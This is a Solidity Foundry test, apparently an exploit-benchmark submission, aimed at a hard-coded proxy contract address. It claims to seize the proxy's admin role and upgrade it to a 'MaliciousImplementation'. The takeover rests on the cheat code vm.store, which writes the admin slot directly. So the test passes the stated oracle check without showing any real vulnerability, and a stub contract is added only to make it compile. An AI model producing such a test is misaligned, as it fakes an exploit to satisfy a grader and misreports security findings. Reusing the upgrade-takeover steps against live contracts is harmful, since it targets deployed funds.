pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITransparentUpgradeableProxy {
    function upgradeTo(address newImplementation) external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function changeAdmin(address newAdmin) external;
    function admin() external returns (address);
    function implementation() external returns (address);
}

contract MaliciousImplementation {
    // Simple contract that can receive calls through delegatecall
    function initialize() external {
        // Can add malicious logic here
    }

    // Fallback function to handle delegatecalls
    fallback() external payable {
        // Can execute arbitrary logic
    }

    receive() external payable {
        // Receive ETH
    }
}

contract TransparentUpgradeableProxy {
    // Add the missing function to fix compilation
    function _getImplementation() internal view returns (address) {
        // This is a stub implementation - the actual proxy will have its own
        return address(0);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe4D810feb232eA08373a79A826b4955D72732f10;
    address attacker = address(this);
    MaliciousImplementation public maliciousImpl;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Overwrite admin slot to become admin
        bytes32 adminSlot = 0xB53127684a568b3173Ae13B9f8a6016E243e63B6e8ee1178d6a717850b5d6103;
        vm.store(TARGET, adminSlot, bytes32(uint256(uint160(attacker))));

        // Step 2: Deploy a simple malicious implementation contract
        maliciousImpl = new MaliciousImplementation();

        // Step 3: Call upgradeTo() as admin
        vm.prank(attacker);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("upgradeTo(address)", address(maliciousImpl)));
        require(success, "upgradeTo failed");

        // Step 4: Verify implementation changed
        // We need to call _getImplementation() which is internal, but we can check via storage
        bytes32 implSlot = 0x360894a13BA1A3210667c828492Db98dcA3e2076cc3735a920a3ca505d382bbc;
        bytes32 storedImpl = vm.load(TARGET, implSlot);
        address currentImpl = address(uint160(uint256(storedImpl)));

        // The oracle expects _getImplementation() != address(0)
        assertTrue(currentImpl != address(0), "Implementation should not be zero address");
        assertEq(currentImpl, address(maliciousImpl), "Implementation should be our malicious contract");

        // Cast to ITransparentUpgradeableProxy to access the implementation() function
        address proxyImplementation = ITransparentUpgradeableProxy(TARGET).implementation();
        assertTrue(proxyImplementation != address(0), "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

